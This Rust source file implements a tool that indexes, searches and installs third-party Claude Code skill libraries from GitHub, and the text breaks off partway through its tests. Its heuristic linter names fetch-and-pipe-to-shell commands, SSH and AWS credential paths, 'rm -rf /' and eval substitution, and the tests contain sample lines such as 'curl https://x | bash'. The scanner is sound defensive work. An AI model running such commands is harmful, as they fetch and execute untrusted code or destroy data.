//! `agent-bridge skills` — index third-party Claude Code skill libraries.
//!
//! ### Subcommands
//!
//! - `skills index <source>` — clone (if URL) or read (if local path) a
//!   repo, walk for skill files, parse frontmatter, lint, and save each
//!   skill as a memory record (`kind = "skill"`).
//! - `skills seed` — index the curated seed corpus (see [`SEED_REPOS`]).
//! - `skills refresh` — re-index every previously-indexed GitHub source to
//!   pick up upstream changes (cron / Stop-hook friendly).
//! - `skills search <query>` — semantic search over indexed skills.
//! - `skills list` — list indexed skills (most-recent first).
//! - `skills show <key>` — print one skill's body and metadata.
//!
//! ### Discovery patterns
//!
//! Walks the cloned repo and matches, in priority order:
//!   1. `**/SKILL.md` (Anthropic canonical: parent dir name = skill name)
//!   2. `.claude/skills/**/*.md` (project-local Claude Code form)
//!   3. `skills/*.md` (some community repos)
//!
//! ### Lint
//!
//! Heuristic safety scan over each skill body. Flags `curl|bash`,
//! `wget|sh`, hardcoded credential paths, `rm -rf /` patterns, etc.
//! Severity counts land in `tags` (`lint:clean` / `lint:warn:N` /
//! `lint:danger:N`); the indexer **does not refuse to save** — surfacing
//! the warning to the user is the point. Manual review still recommended.

use ab_store::{MemoryListSort, MemoryRecord, SqliteStore, StateStore};
use anyhow::{anyhow, bail, Context, Result};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::time::SystemTime;

/// Curated seed corpus (Phase A). All known to publish Claude Code skills
/// in the canonical `<skill-name>/SKILL.md` layout (or a close variant).
/// Add/remove entries here; `skills seed` indexes the lot.
pub const SEED_REPOS: &[&str] = &[
    "https://github.com/anthropics/skills",
    "https://github.com/anthropics/claude-plugins-official",
    "https://github.com/alirezarezvani/claude-skills",
    "https://github.com/Jeffallan/claude-skills",
    "https://github.com/Imbad0202/academic-research-skills",
    "https://github.com/daymade/claude-code-skills",
    "https://github.com/glebis/claude-skills",
    "https://github.com/ahmedasmar/devops-claude-skills",
];

#[derive(Debug, Clone)]
struct SkillFile {
    /// `<owner>/<repo>` — derived from the source URL or repo path.
    src: String,
    /// Skill name (folder name for SKILL.md, filename otherwise).
    name: String,
    /// Path inside the repo (relative).
    rel_path: PathBuf,
    /// Raw file body.
    body: String,
}

#[derive(Debug, Default, Clone)]
struct Frontmatter {
    name: Option<String>,
    description: Option<String>,
    allowed_tools: Vec<String>,
    /// agentskills.io spec optional field — license name or filename.
    license: Option<String>,
    /// agentskills.io spec optional field — environment requirements (≤500 chars).
    compatibility: Option<String>,
    /// Any other key=value pairs we don't model explicitly. Spec-defined
    /// `metadata` (arbitrary key-value mapping) lands here too — we don't
    /// expand it per-key because the spec leaves the inner shape open.
    extras: BTreeMap<String, String>,
}

/// Known vendor / first-party orgs whose skills we treat as `vendor-curated`
/// for ranking purposes. See `decision_skills_quality_tier_20260507`.
/// Anything not in this list classifies as `community`.
///
/// Sources: agentskills.io client list as of 2026-05-07. Add new orgs here
/// when they ship official skill catalogs we trust.
const KNOWN_VENDORS: &[&str] = &[
    "anthropics",
    "warpdotdev",
    "google-gemini",
    "google-ai-edge",
    "openai",
    "microsoft",
    "github",
    "block",          // Goose
    "OpenHands",
    "letta-ai",
    "sst",            // OpenCode
    "RooCodeInc",
    "mistralai",
    "bytedance",
    "spring-projects",
    "jetbrains",
    "snowflake",
    "databricks",
    "laravel",
    "cursor",
];

fn classify_vendor(src: &str) -> &'static str {
    let owner = src.split('/').next().unwrap_or(src);
    if KNOWN_VENDORS.iter().any(|v| v.eq_ignore_ascii_case(owner)) {
        "vendor-curated"
    } else {
        "community"
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[allow(dead_code)] // Info reserved for future heuristics that flag without warning.
enum LintSev {
    Info,
    Warn,
    Danger,
}

#[derive(Debug, Clone)]
struct LintFinding {
    sev: LintSev,
    rule: &'static str,
    snippet: String,
}

/// Indexer entry-point: handle either a URL or a local path.
pub async fn run_index(source: &str, verbose: bool) -> Result<usize> {
    let (owned_clone, repo_dir, src_id) = resolve_source(source)?;
    if verbose {
        eprintln!("[skills] indexing {} (path: {})", src_id, repo_dir.display());
    }
    let files = walk_skill_files(&repo_dir, &src_id)?;
    if files.is_empty() {
        eprintln!(
            "[skills] {}: no SKILL.md or .claude/skills/*.md files found",
            src_id
        );
        if owned_clone {
            let _ = std::fs::remove_dir_all(&repo_dir);
        }
        return Ok(0);
    }
    let store = open_store().await?;
    let mut saved = 0usize;
    for sf in files {
        match build_record(&sf) {
            Ok(rec) => {
                if verbose {
                    eprintln!(
                        "[skills]   + {} ({} chars, {} tags)",
                        rec.key,
                        rec.content.len(),
                        rec.tags.len()
                    );
                }
                store
                    .memory_save(&rec)
                    .await
                    .with_context(|| format!("memory_save failed for {}", rec.key))?;
                saved += 1;
            }
            Err(e) => eprintln!(
                "[skills]   skipped {}: {}",
                sf.rel_path.display(),
                e
            ),
        }
    }
    eprintln!("[skills] {}: indexed {} skills", src_id, saved);
    if owned_clone {
        let _ = std::fs::remove_dir_all(&repo_dir);
    }
    Ok(saved)
}

/// Index every entry in [`SEED_REPOS`]. Continues on per-repo failure.
pub async fn run_seed(verbose: bool) -> Result<()> {
    let mut total = 0usize;
    let mut failed = Vec::new();
    for url in SEED_REPOS {
        match run_index(url, verbose).await {
            Ok(n) => total += n,
            Err(e) => {
                eprintln!("[skills] {}: FAILED: {}", url, e);
                failed.push(*url);
            }
        }
    }
    eprintln!(
        "[skills] seed corpus: {} skills indexed, {} repos failed",
        total,
        failed.len()
    );
    if !failed.is_empty() {
        eprintln!("[skills] failed repos:");
        for u in failed {
            eprintln!("  - {}", u);
        }
    }
    Ok(())
}

/// Re-index every previously-indexed GitHub source.
///
/// Walks all `kind=skill` records, collects distinct `src:` tag values that
/// look like `<owner>/<repo>`, and re-runs [`run_index`] for each as
/// `https://github.com/<owner>/<repo>`. Local-path sources (basenames with
/// no `/`) are reported and skipped — they need a manual `skills index`.
pub async fn run_refresh(verbose: bool) -> Result<()> {
    let store = open_store().await?;
    let rows = store
        .list_memories(Some("skill"), MemoryListSort::Recent, u32::MAX)
        .await
        .context("list_memories failed")?;
    if rows.is_empty() {
        eprintln!("[skills] none indexed yet — try `agent-bridge skills seed`");
        return Ok(());
    }
    let mut github_srcs: Vec<String> = Vec::new();
    let mut seen: std::collections::BTreeSet<String> = std::collections::BTreeSet::new();
    let mut local_srcs: std::collections::BTreeSet<String> = std::collections::BTreeSet::new();
    for r in &rows {
        let Some(src) = tag_value(&r.tags, "src:") else {
            continue;
        };
        if is_github_src(&src) {
            if seen.insert(src.clone()) {
                github_srcs.push(src);
            }
        } else {
            local_srcs.insert(src);
        }
    }
    eprintln!(
        "[skills] refresh: {} github source(s), {} local source(s) skipped, {} record(s) total",
        github_srcs.len(),
        local_srcs.len(),
        rows.len()
    );
    if !local_srcs.is_empty() && verbose {
        eprintln!("[skills]   local sources (re-run `skills index <path>` manually):");
        for s in &local_srcs {
            eprintln!("[skills]     - {}", s);
        }
    }
    let mut total = 0usize;
    let mut failed: Vec<String> = Vec::new();
    for src in &github_srcs {
        let url = format!("https://github.com/{}", src);
        match run_index(&url, verbose).await {
            Ok(n) => total += n,
            Err(e) => {
                eprintln!("[skills] {}: FAILED: {}", src, e);
                failed.push(src.clone());
            }
        }
    }
    eprintln!(
        "[skills] refresh done: {} skills indexed, {} repo(s) failed",
        total,
        failed.len()
    );
    if !failed.is_empty() {
        eprintln!("[skills] failed repos:");
        for s in failed {
            eprintln!("  - {}", s);
        }
    }
    Ok(())
}

/// `<owner>/<repo>` shape — the form `parse_src_id` emits for GitHub URLs.
/// Local-path indexing produces a basename with no `/`, so this filter
/// distinguishes them.
fn is_github_src(src: &str) -> bool {
    let mut parts = src.split('/');
    let owner = parts.next().unwrap_or("");
    let repo = parts.next().unwrap_or("");
    let extra = parts.next();
    !owner.is_empty() && !repo.is_empty() && extra.is_none()
}

/// Search indexed skills semantically. Filters to `kind = "skill"`.
pub async fn run_search(query: &str, limit: usize) -> Result<()> {
    let store = open_store().await?;
    // memory_search has no kind filter; filter via the "skill" tag instead.
    let tag_filter = vec!["skill".to_string()];
    let hits = store
        .memory_search(query, &tag_filter, limit as u32)
        .await
        .context("memory_search failed")?;
    if hits.is_empty() {
        eprintln!("[skills] no matches for {:?}", query);
        return Ok(());
    }
    for h in hits {
        let summary = first_line(&h.record.content);
        let tools = h
            .record
            .tags
            .iter()
            .find(|t| t.starts_with("tools:"))
            .map(|s| s.as_str())
            .unwrap_or("tools:?");
        let lint = h
            .record
            .tags
            .iter()
            .find(|t| t.starts_with("lint:"))
            .map(|s| s.as_str())
            .unwrap_or("lint:?");
        println!(
            "{:.2}  {}\n      {}\n      [{}, {}]\n",
            h.score, h.record.key, summary, tools, lint
        );
    }
    Ok(())
}

/// List most recently saved skills.
pub async fn run_list(limit: usize) -> Result<()> {
    let store = open_store().await?;
    let rows = store
        .list_memories(Some("skill"), MemoryListSort::Recent, limit as u32)
        .await
        .context("list_memories failed")?;
    if rows.is_empty() {
        eprintln!("[skills] none indexed yet — try `agent-bridge skills seed`");
        return Ok(());
    }
    for r in rows {
        let summary = first_line(&r.content);
        println!("{}\n      {}\n", r.key, summary);
    }
    Ok(())
}

/// Install an indexed skill into `~/.claude/skills/<name>/` by re-cloning
/// the source repo and copying the original SKILL.md (plus siblings, for
/// canonical-layout skills that ship scripts/data). With `assume_yes`,
/// skips the lint-warning confirmation prompt.
pub async fn run_install(key: &str, assume_yes: bool) -> Result<()> {
    let store = open_store().await?;
    let rec = store
        .memory_get(key)
        .await
        .context("memory_get failed")?
        .ok_or_else(|| anyhow!("no skill with key {:?}", key))?;
    let src = tag_value(&rec.tags, "src:")
        .ok_or_else(|| anyhow!("record {} has no src: tag", key))?;
    let rel = tag_value(&rec.tags, "path:").ok_or_else(|| {
        anyhow!(
            "record {} has no path: tag (re-run `skills index` / `skills seed` to backfill)",
            key
        )
    })?;
    let lint_tag = tag_value(&rec.tags, "lint:").unwrap_or_else(|| "lint:?".to_string());
    let dest_name = derive_flat_name(key, &rel);
    let dest_root = claude_skills_dir()?;
    let dest = dest_root.join(&dest_name);

    eprintln!(
        "[install] {} → {}",
        key,
        dest.display(),
    );
    eprintln!("[install]   source: github.com/{} : {}", src, rel);
    eprintln!("[install]   lint:   {}", lint_tag);
    if (lint_tag.starts_with("lint:warn:") || lint_tag.starts_with("lint:danger:"))
        && !assume_yes
    {
        eprintln!(
            "[install]   skill flagged by lint — review SKILL.md before approving."
        );
        eprintln!("[install]   re-run with `--yes` to install anyway.");
        bail!("aborted: lint flags require explicit --yes");
    }
    if dest.exists() && !assume_yes {
        eprintln!(
            "[install]   destination already exists: {}",
            dest.display()
        );
        eprintln!("[install]   re-run with `--yes` to overwrite.");
        bail!("aborted: destination exists");
    }

    // Clone, copy, clean up.
    let url = format!("https://github.com/{}", src);
    let clone_dir = clone_shallow(&url, &src.replace('/', "_"))?;
    let source_path = clone_dir.join(&rel);
    if !source_path.exists() {
        let _ = std::fs::remove_dir_all(&clone_dir);
        bail!(
            "expected file {} in cloned repo but it's missing — upstream may have moved",
            rel
        );
    }
    std::fs::create_dir_all(&dest_root).with_context(|| {
        format!("create dest root {}", dest_root.display())
    })?;
    if dest.exists() {
        std::fs::remove_dir_all(&dest)
            .or_else(|_| std::fs::remove_file(&dest))
            .with_context(|| format!("remove existing {}", dest.display()))?;
    }
    let canonical = source_path
        .file_name()
        .and_then(|n| n.to_str())
        .map(|n| n.eq_ignore_ascii_case("SKILL.md"))
        .unwrap_or(false);
    if canonical {
        // Copy the entire parent directory so sibling scripts/data come along.
        let parent = source_path
            .parent()
            .ok_or_else(|| anyhow!("SKILL.md has no parent dir"))?;
        copy_dir_recursive(parent, &dest)?;
    } else {
        // Single-file skill — drop just the .md.
        std::fs::create_dir_all(&dest).with_context(|| {
            format!("create dest dir {}", dest.display())
        })?;
        let leaf = source_path
            .file_name()
            .ok_or_else(|| anyhow!("source has no filename"))?;
        std::fs::copy(&source_path, dest.join(leaf)).with_context(|| {
            format!("copy {} → {}", source_path.display(), dest.display())
        })?;
    }
    let _ = std::fs::remove_dir_all(&clone_dir);
    eprintln!("[install] done");
    Ok(())
}

fn tag_value(tags: &[String], prefix: &str) -> Option<String> {
    tags.iter()
        .find(|t| t.starts_with(prefix))
        .map(|t| t[prefix.len()..].to_string())
}

fn derive_flat_name(key: &str, rel_path: &str) -> String {
    // Prefer the parent dir of SKILL.md (canonical) or the filename stem
    // (single-file). Falls back to the last `/` segment of the key.
    let path = std::path::PathBuf::from(rel_path);
    if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
        if name.eq_ignore_ascii_case("SKILL.md") {
            if let Some(parent) = path.parent().and_then(|p| p.file_name()).and_then(|n| n.to_str())
            {
                return parent.to_string();
            }
        } else if name.ends_with(".md") {
            return name.trim_end_matches(".md").to_string();
        }
    }
    key.rsplit('/').next().unwrap_or(key).to_string()
}

fn claude_skills_dir() -> Result<PathBuf> {
    let home = std::env::var("HOME").context("HOME not set")?;
    Ok(PathBuf::from(home).join(".claude").join("skills"))
}

fn copy_dir_recursive(src: &Path, dest: &Path) -> Result<()> {
    std::fs::create_dir_all(dest)
        .with_context(|| format!("create dir {}", dest.display()))?;
    for entry in std::fs::read_dir(src)
        .with_context(|| format!("read dir {}", src.display()))?
    {
        let entry = entry?;
        let from = entry.path();
        let to = dest.join(entry.file_name());
        if entry.file_type()?.is_dir() {
            copy_dir_recursive(&from, &to)?;
        } else {
            std::fs::copy(&from, &to)
                .with_context(|| format!("copy {} → {}", from.display(), to.display()))?;
        }
    }
    Ok(())
}

/// Print one skill's body + metadata.
pub async fn run_show(key: &str) -> Result<()> {
    let store = open_store().await?;
    let rec = store
        .memory_get(key)
        .await
        .context("memory_get failed")?
        .ok_or_else(|| anyhow!("no skill with key {:?}", key))?;
    println!("# {}", rec.key);
    println!("tags: {}", rec.tags.join(", "));
    println!("---");
    println!("{}", rec.content);
    Ok(())
}

// ── source resolution ─────────────────────────────────────────────────────

/// Returns `(owned_clone, repo_dir, src_id)`. `src_id` is `<owner>/<repo>`
/// for URLs, or the basename for local paths.
fn resolve_source(source: &str) -> Result<(bool, PathBuf, String)> {
    if source.starts_with("http://") || source.starts_with("https://") || source.starts_with("git@")
    {
        let src_id = parse_src_id(source)?;
        let dir = clone_shallow(source, &src_id)?;
        Ok((true, dir, src_id))
    } else {
        let p = PathBuf::from(source);
        if !p.exists() {
            bail!("source path does not exist: {}", p.display());
        }
        let canon = p.canonicalize().unwrap_or(p);
        let src_id = canon
            .file_name()
            .map(|s| s.to_string_lossy().to_string())
            .unwrap_or_else(|| "unknown".to_string());
        Ok((false, canon, src_id))
    }
}

fn parse_src_id(url: &str) -> Result<String> {
    // Accepts https://github.com/owner/repo[.git] and git@github.com:owner/repo.git.
    let stripped = url.trim_end_matches('/').trim_end_matches(".git");
    let after = stripped
        .rsplit("github.com")
        .next()
        .ok_or_else(|| anyhow!("not a github URL: {}", url))?;
    // after = "/owner/repo" or ":owner/repo"
    let cleaned = after.trim_start_matches([':', '/']);
    let parts: Vec<&str> = cleaned.split('/').collect();
    if parts.len() < 2 {
        bail!("could not parse owner/repo from {}", url);
    }
    Ok(format!("{}/{}", parts[0], parts[1]))
}

fn clone_shallow(url: &str, src_id: &str) -> Result<PathBuf> {
    let nonce = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let safe_id = src_id.replace('/', "_");
    let dir = std::env::temp_dir().join(format!("ab-skills-{}-{}", safe_id, nonce));
    let status = Command::new("git")
        .args([
            "clone",
            "--depth=1",
            "--quiet",
            "--filter=blob:none",
            url,
            &dir.to_string_lossy(),
        ])
        .stdout(Stdio::null())
        .stderr(Stdio::inherit())
        .status()
        .with_context(|| format!("git clone {} failed to launch", url))?;
    if !status.success() {
        bail!("git clone {} exited with {:?}", url, status.code());
    }
    Ok(dir)
}

// ── walk ──────────────────────────────────────────────────────────────────

fn walk_skill_files(repo: &Path, src_id: &str) -> Result<Vec<SkillFile>> {
    let mut out = Vec::new();
    let walker = walkdir::WalkDir::new(repo)
        .max_depth(8)
        .follow_links(false)
        .into_iter()
        .filter_entry(|e| {
            // Skip .git, node_modules, target
            let name = e.file_name().to_string_lossy();
            !matches!(name.as_ref(), ".git" | "node_modules" | "target" | "dist")
        });
    for entry in walker.flatten() {
        if !entry.file_type().is_file() {
            continue;
        }
        let path = entry.path();
        let rel = path.strip_prefix(repo).unwrap_or(path).to_path_buf();
        let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
            continue;
        };
        let comps: Vec<String> = rel
            .components()
            .map(|c| c.as_os_str().to_string_lossy().to_string())
            .collect();
        // Pattern 1 (canonical): any path ending in `<dir>/SKILL.md`. Most
        // community repos and Anthropic's official layout use this.
        let canonical = name.eq_ignore_ascii_case("SKILL.md");
        // Pattern 2: a single-file skill directly under .claude/skills/
        //   `[".claude", "skills", "<name>.md"]` (depth = 3).
        let claude_skills_top = comps.len() == 3
            && comps[0] == ".claude"
            && comps[1] == "skills"
            && name.ends_with(".md");
        // Pattern 3: a single-file skill directly under skills/
        //   `["skills", "<name>.md"]` (depth = 2).
        let skills_top = comps.len() == 2 && comps[0] == "skills" && name.ends_with(".md");
        if !canonical && !claude_skills_top && !skills_top {
            continue;
        }
        let body = std::fs::read_to_string(path)
            .with_context(|| format!("read {}", path.display()))?;
        let skill_name = if canonical {
            // Use the FULL parent path (relative to repo root) so nested
            // SKILL.md files at e.g. `claude-api/REFERENCE/SKILL.md` get
            // a distinct key from the parent `claude-api/SKILL.md`.
            // Strip leading `skills/` or `.claude/skills/` boilerplate
            // so the key is `<src>/<name>` not `<src>/skills/<name>`.
            let parent = rel
                .parent()
                .filter(|p| !p.as_os_str().is_empty())
                .map(|p| p.to_string_lossy().to_string())
                .unwrap_or_else(|| "skill".to_string());
            strip_skills_prefix(&parent).to_string()
        } else {
            // strip extension
            name.trim_end_matches(".md").to_string()
        };
        out.push(SkillFile {
            src: src_id.to_string(),
            name: skill_name,
            rel_path: rel,
            body,
        });
    }
    Ok(out)
}

/// Strip a leading boilerplate prefix (`.agents/skills/` per agentskills.io
/// spec, `.claude/skills/` legacy Claude Code, or bare `skills/`) from a
/// relative path so the resulting skill key is shorter and stable across
/// repo layouts.
fn strip_skills_prefix(path: &str) -> &str {
    for prefix in [".agents/skills/", ".claude/skills/", "skills/"] {
        if let Some(rest) = path.strip_prefix(prefix) {
            return rest;
        }
    }
    path
}

// ── frontmatter parser ────────────────────────────────────────────────────

fn split_frontmatter(body: &str) -> (Frontmatter, &str) {
    let trimmed = body.trim_start_matches('\u{feff}');
    let after_open = if let Some(rest) = trimmed.strip_prefix("---\n") {
        rest
    } else if let Some(rest) = trimmed.strip_prefix("---\r\n") {
        rest
    } else {
        return (Frontmatter::default(), trimmed);
    };
    // Locate the closing "---" on its own line; accept either LF or CRLF.
    let closing = ["\n---\n", "\n---\r\n"]
        .iter()
        .filter_map(|m| after_open.find(m).map(|i| (i, m.len())))
        .min_by_key(|(i, _)| *i);
    let (yaml_end, marker_len) = match closing {
        Some(v) => v,
        None => return (Frontmatter::default(), trimmed),
    };
    let yaml_section = &after_open[..yaml_end];
    let body_after = &after_open[yaml_end + marker_len..];

    let mut fm = Frontmatter::default();
    for line in yaml_section.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let Some((k, v)) = line.split_once(':') else {
            continue;
        };
        let key = k.trim();
        let mut val = v.trim().trim_matches('"').trim_matches('\'').to_string();
        match key {
            "name" => fm.name = Some(val),
            "description" => fm.description = Some(val),
            "license" => fm.license = Some(val),
            "compatibility" => fm.compatibility = Some(val),
            "allowed-tools" | "allowed_tools" | "tools" => {
                // Spec (agentskills.io): "space-separated string of pre-approved
                // tools". Tolerate two legacy forms still in the wild:
                //   - YAML inline list: `[Read, Grep]` → split on commas
                //   - Bare string: `Bash(git:*) Read` → split on whitespace
                let bracketed = val.starts_with('[') && val.ends_with(']');
                if bracketed {
                    val = val[1..val.len() - 1].to_string();
                }
                let split_iter: Box<dyn Iterator<Item = &str>> = if bracketed {
                    Box::new(val.split(','))
                } else {
                    Box::new(val.split_whitespace())
                };
                fm.allowed_tools = split_iter
                    .map(|s| s.trim().trim_matches('"').trim_matches('\'').to_string())
                    .filter(|s| !s.is_empty())
                    .collect();
            }
            other => {
                fm.extras.insert(other.to_string(), val);
            }
        }
    }
    (fm, body_after)
}

// ── lint ──────────────────────────────────────────────────────────────────

fn lint_body(body: &str) -> Vec<LintFinding> {
    let mut out = Vec::new();
    let cred_paths = [".ssh/id_", ".aws/credentials", "/.env\"", "/.env'"];
    let dangerous_rm = ["rm -rf /", "rm -rf $home", "rm -rf ~"];
    let pipe_shell_suffixes = [
        "| bash", "|bash", "| sh", "|sh", "| zsh", "|zsh", "| bash -",
    ];

    for (i, line) in body.lines().enumerate() {
        let lower = line.to_ascii_lowercase();
        let trimmed = lower.trim_end_matches(|c: char| c.is_whitespace() || c == ')');

        // pipe-to-shell: require BOTH a fetch verb AND a pipe-to-sh suffix
        // on the same line. Avoids the markdown-table false positives that
        // bare "| bash" patterns produce (`| Bash Tool | ...`).
        let fetches = lower.contains("curl ")
            || lower.contains("wget ")
            || lower.contains("fetch ")
            || lower.contains("iwr ")
            || lower.contains("invoke-webrequest");
        let pipes_to_shell = pipe_shell_suffixes
            .iter()
            .any(|s| trimmed.ends_with(s) || lower.contains(&format!("{} ", s)));
        if fetches && pipes_to_shell {
            out.push(LintFinding {
                sev: LintSev::Warn,
                rule: "pipe-to-shell",
                snippet: format!("L{}: {}", i + 1, line.trim()),
            });
        }
        for pat in cred_paths {
            if lower.contains(pat) {
                out.push(LintFinding {
                    sev: LintSev::Warn,
                    rule: "creds-path",
                    snippet: format!("L{}: {}", i + 1, line.trim()),
                });
                break;
            }
        }
        for pat in dangerous_rm {
            if lower.contains(pat) {
                out.push(LintFinding {
                    sev: LintSev::Danger,
                    rule: "dangerous-rm",
                    snippet: format!("L{}: {}", i + 1, line.trim()),
                });
                break;
            }
        }
        if lower.contains("eval $(") || lower.contains("eval `") {
            out.push(LintFinding {
                sev: LintSev::Warn,
                rule: "eval-substitution",
                snippet: format!("L{}: {}", i + 1, line.trim()),
            });
        }
    }
    out
}

fn lint_summary_tag(findings: &[LintFinding]) -> String {
    let danger = findings.iter().filter(|f| f.sev == LintSev::Danger).count();
    let warn = findings.iter().filter(|f| f.sev == LintSev::Warn).count();
    if danger > 0 {
        format!("lint:danger:{}", danger)
    } else if warn > 0 {
        format!("lint:warn:{}", warn)
    } else if !findings.is_empty() {
        format!("lint:info:{}", findings.len())
    } else {
        "lint:clean".to_string()
    }
}

// ── record building ───────────────────────────────────────────────────────

fn build_record(sf: &SkillFile) -> Result<MemoryRecord> {
    let (fm, body) = split_frontmatter(&sf.body);
    // Key = repo + path-derived skill identifier. We deliberately do NOT
    // use frontmatter `name` here, because nested skills at different
    // paths can share the same `name` (e.g. multiple "README"-titled
    // SKILL.md files); the path discriminator keeps keys unique.
    let key = format!("skill:{}/{}", sf.src, sf.name);
    let description = fm
        .description
        .clone()
        .unwrap_or_else(|| first_line(body).to_string());
    let findings = lint_body(body);
    for f in &findings {
        if matches!(f.sev, LintSev::Warn | LintSev::Danger) {
            eprintln!(
                "[skills]   ! {} [{:?}/{}] {}",
                key, f.sev, f.rule, f.snippet
            );
        }
    }

    // `path:<rel>` records the original SKILL.md location inside the repo
    // so `skills install` can re-clone and copy the right folder. We keep
    // it as a tag (not the key) so the human-facing key stays short and
    // dedupe-friendly across boilerplate-prefix variations.
    let path_str = sf.rel_path.to_string_lossy().to_string();
    let mut tags = vec![
        "skill".to_string(),
        format!("src:{}", sf.src),
        format!("path:{}", path_str),
        lint_summary_tag(&findings),
        // vendor classification — feeds ranking / filtering. See
        // KNOWN_VENDORS const above for what counts as vendor-curated.
        format!("vendor:{}", classify_vendor(&sf.src)),
    ];
    // Preserve agentskills.io spec optional fields as tags. They're not
    // used for embedding signal (which is description + body), but they
    // matter for compliance, redistribution, and environment-aware
    // filtering. Keeping them as tags lets `memory_search` filter without
    // re-parsing.
    if let Some(lic) = &fm.license {
        tags.push(format!("license:{}", lic));
    }
    if let Some(compat) = &fm.compatibility {
        tags.push(format!("compatibility:{}", compat));
    }
    if !fm.allowed_tools.is_empty() {
        // Stored comma-joined in the tag value for grep/filter ergonomics;
        // input parser accepts both space-separated (spec) and bracketed
        // YAML list (legacy).
        tags.push(format!("tools:{}", fm.allowed_tools.join(",")));
    }

    // Body for the memory record: description (for embedding signal) +
    // separator + the actual skill body. Description first means the
    // embedding gets a strong topical signal even when the body is long.
    let content = format!("{}\n\n{}", description, body.trim_start());

    let now = unix_now();
    Ok(MemoryRecord {
        key,
        kind: "skill".to_string(),
        content,
        tags,
        related_keys: Vec::new(),
        scope: Some("global".to_string()),
        created_at: now,
        updated_at: now,
        last_accessed_at: now,
        access_count: 0,
        importance: 0.5,
        status: "active".to_string(),
        trigger_pattern: None,
    })
}

// ── small helpers ─────────────────────────────────────────────────────────

fn first_line(s: &str) -> &str {
    s.lines().find(|l| !l.trim().is_empty()).unwrap_or("").trim()
}

fn unix_now() -> i64 {
    SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0)
}

async fn open_store() -> Result<SqliteStore> {
    let db_path = std::env::var("AGENT_BRIDGE_DB")
        .ok()
        .map(PathBuf::from)
        .unwrap_or_else(ab_store::default_db_path);
    SqliteStore::open(&db_path)
        .await
        .with_context(|| format!("open SqliteStore at {}", db_path.display()))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn frontmatter_basic() {
        let body = "---\nname: foo\ndescription: A small thing\n---\nBody text\n";
        let (fm, rest) = split_frontmatter(body);
        assert_eq!(fm.name.as_deref(), Some("foo"));
        assert_eq!(fm.description.as_deref(), Some("A small thing"));
        assert!(rest.starts_with("Body"), "rest={:?}", rest);
    }

    #[test]
    fn frontmatter_allowed_tools_inline_list() {
        let body = "---\nname: x\nallowed-tools: [Read, Grep]\n---\nbody";
        let (fm, _) = split_frontmatter(body);
        assert_eq!(fm.allowed_tools, vec!["Read", "Grep"]);
    }

    #[test]
    fn frontmatter_missing_returns_full_body() {
        let body = "no frontmatter here\n";
        let (fm, rest) = split_frontmatter(body);
        assert!(fm.name.is_none());
        assert_eq!(rest, body);
    }

    #[test]
    fn parse_src_id_https() {
        assert_eq!(
            parse_src_id("https://github.com/anthropics/skills").unwrap(),
            "anthropics/skills"
        );
        assert_eq!(
            parse_src_id("https://github.com/foo/bar.git").unwrap(),
            "foo/bar"
        );
        assert_eq!(
            parse_src_id("git@github.com:foo/bar.git").unwrap(),
            "foo/bar"
        );
    }

    #[test]
    fn is_github_src_classification() {
        assert!(is_github_src("anthropics/skills"));
        assert!(is_github_src("warpdotdev/oz-skills"));
        assert!(is_github_src("oz-skills-test/.agents"));
        assert!(!is_github_src(""));
        assert!(!is_github_src("local-checkout"));
        assert!(!is_github_src("anthropics"));
        assert!(!is_github_src("a/b/c"));
        assert!(!is_github_src("/foo"));
    }

    #[test]
    fn lint_flags_pipe_to_shell() {
        let body = "Run this:\n```\ncurl https://x | bash\n```\n";
        let f = lint_body(body);
        assert!(f.iter().any(|x| x.rule == "pipe-to-shell"));
    }

    #[test]
    fn derive_flat_name_basic() {
        assert_eq!(
            derive_flat_name("skill:anthropics/skills/pdf", "pdf/SKILL.md"),
            "pdf"
        );
        assert_eq!(
            derive_flat_name(
                "skill:alirezarezvani/claude-skills/x",
                "skills/x/SKILL.md"
            ),
            "x"
        );
        assert_eq!(
            derive_flat_name("skill:foo/bar/single", ".claude/skills/single.md"),
            "single"
        );
        // Fallback when path doesn't fit the patterns.
        assert_eq!(
            derive_flat_name("skill:foo/bar/baz", "weird/path"),
            "baz"
        );
    }

    #[test]
    fn tag_value_extracts_prefixed_payload() {
        let tags = vec![
            "skill".to_string(),
            "src:anthropics/skills".to_string(),
            "path:pdf/SKILL.md".to_string(),
            "lint:clean".to_string(),
        ];
        assert_eq!(tag_value(&tags, "src:"), Some("anthropics/skills".to_string()));
        assert_eq!(tag_value(&tags, "path:"), Some("pdf/SKILL.md".to_string()));
        assert_eq!(tag_value(&tags, "missing:"), None);
    }

    #[test]
    fn strip_skills_prefix_handles_layouts() {
        assert_eq!(strip_skills_prefix("skills/xlsx"), "xlsx");
        assert_eq!(strip_skills_prefix(".claude/skills/foo"), "foo");
        // agentskills.io standard layout (used by warpdotdev/oz-skills,
        // sst/opencode, RooCodeInc/Roo-Code, etc.).
        assert_eq!(
            strip_skills_prefix(".agents/skills/mcp-builder"),
            "mcp-builder"
        );
        assert_eq!(strip_skills_prefix("a/b/c"), "a/b/c");
        // only strips a SINGLE leading segment — nested skills inside
        // skills/ keep their internal structure.
        assert_eq!(strip_skills_prefix("skills/api/REFERENCE"), "api/REFERENCE");
    }

    #[test]
    fn lint_does_not_fire_on_markdown_tables() {
        // Common false-positive shape: a markdown table cell containing the
        // word "Bash" or "sh" should not trigger pipe-to-shell.
        let body = "| Tool | Description |\n| Bash Tool | run shell |\n| Read | read files |\n";
        let f = lint_body(body);
        assert!(
            !f.iter().any(|x| x.rule == "pipe-to-shell"),
            "false positive: {:?}",
            f
        );
    }

    #[test]
    fn lint_flags_dangerous_rm() {
        let body = "rm -rf / # don't actually do this";
        let f = lint_body(body);
        assert!(f.iter().any(|x| x.rule == "dangerous-rm" && x.sev == LintSev::Danger));
    }

    #[test]
    fn lint_clean_summary() {
        assert_eq!(lint_summary_tag(&[]), "lint:clean");
    }

    // ── agentskills.io spec compliance ──────────────────────────────────

    #[test]
    fn frontmatter_allowed_tools_space_separated_per_spec() {
